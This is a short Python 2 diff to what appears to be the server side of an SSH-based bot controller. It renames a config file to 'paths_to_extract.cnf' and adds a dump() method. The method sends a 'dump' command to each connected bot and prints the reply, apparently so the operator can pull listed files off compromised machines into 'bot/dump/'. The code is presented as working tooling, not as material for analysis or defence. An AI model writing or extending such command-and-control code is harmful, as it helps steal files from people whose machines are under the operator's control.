@@ -5,7 +5,7 @@ import ChannelSSH
 from time import  time
 host_key = RSAKey(filename='./rsa.key')
 path_destination = "bot/dump/"
-path_source = "bot/fichi.cnf"
+path_source = "bot/paths_to_extract.cnf"
 class Client():
 
     def __init__(self, sock, addr):
@@ -54,3 +54,9 @@ class Client():
 
     def toclose(self):
         self.closed = True
+
+    def dump(self):
+        print "\n==> Bot: "+str(self.address)+"\n"
+        ChannelSSH.sendToChannel("dump", self.chan)
+        print ChannelSSH.receiveFromChannel(self.chan)
+
